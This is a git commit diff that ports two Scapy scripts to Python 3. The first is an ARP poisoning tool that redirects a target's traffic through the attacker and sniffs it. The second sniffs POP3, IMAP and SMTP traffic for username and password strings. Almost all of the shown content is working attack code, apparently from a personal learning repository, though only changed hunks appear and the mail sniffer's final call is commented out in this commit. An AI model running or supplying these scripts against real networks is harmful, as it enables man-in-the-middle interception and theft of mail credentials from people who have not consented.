cfc726a32ded37d640cdc24ba1433ea7001da5f3
huantingwei <ting02940@gmail.com>
2020-10-04 11:13:58 -0400

    fix: update scapy to python3

--- scapy/arper.py
+++ scapy/arper.py
@@ -15,7 +15,7 @@ conf.verb = 0
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
-    print "[*] Restoring target..."
+    print("[*] Restoring target...")
 
     send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
@@ -24,7 +24,7 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
 
 def get_mac(ip_address):
-    responses, unanswered = srp( Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
+    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
     
     for s, r in responses:
         return r[Ether].src
@@ -45,7 +45,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     poison_gateway.pdst  = gateway_ip
     poison_gateway.hwdst = gateway_mac
 
-    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
+    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
 
     while True:
         try:
@@ -56,37 +56,37 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
         except KeyboardInterrupt:
             restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     
-    print "[*] ARP poison attack finished."
+    print("[*] ARP poison attack finished.")
     return
 
 ############################
 # main program starts here
 ############################
 
-print "[*] Setting up %s" % interface
+print("[*] Setting up %s" % interface)
 
 # get corresponding MAC address of gateway IP and target IP
 gateway_mac = get_mac(gateway_ip)
 if gateway_mac is None:
-    print "[!!!] Failed to get gateway MAC. Exiting..."
+    print("[!!!] Failed to get gateway MAC. Exiting...")
     sys.exit(0)
 else:
-    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)
+    print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))
 
 
 target_mac = get_mac(target_ip)
 if target_mac is None:
-    print "[!!!] Failed to get target MAC. Exiting..."
+    print("[!!!] Failed to get target MAC. Exiting...")
     sys.exit(0)
 else:
-    print "[*] Target %s is at %s" % (target_ip, target_mac)
+    print("[*] Target %s is at %s" % (target_ip, target_mac))
 
 # start poison thread
 poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
 poison_thread.start()
 
 try:
-    print "[*] Starting sniffer for %d packets" % packet_count
+    print("[*] Starting sniffer for %d packets" % packet_count)
 
     bpf_filter = "ip host %s" % target_ip
     packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
--- scapy/mail_sniffer.py
+++ scapy/mail_sniffer.py
@@ -1,16 +1,20 @@
 from scapy.all import *
 
+def show(packet):
+    print(packet.show())
+
+
 def packet_callback(packet):
     if packet[TCP].payload:
         mail_packet = str(packet[TCP].payload)
 
         if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
-            print "[*] Server: %s" % packet[IP].dst
-            print "[*] %s" % packet[TCP].payload
+            print("[*] Server: %s" % packet[IP].dst)
+            print("[*] %s" % packet[TCP].payload)
 
 
 
-print "Start..."
+print("Start...")
 
 # filter with syntax similar to wireshark
 # only email protocol
@@ -18,5 +22,11 @@ print "Start..."
 # 143: IMAP
 # 25 : SMTP
 
+# without filter
+# sniff(prn=show, count=1)
+
+# with filter
 # store = 0 : do not store any packet in memory
-sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
+# !!! scapy seems to have bug for the filter !!!
+# sniff(filter="TCP port 110 or TCP port 25 or TCP port 143", prn=packet_callback, store=0)
+
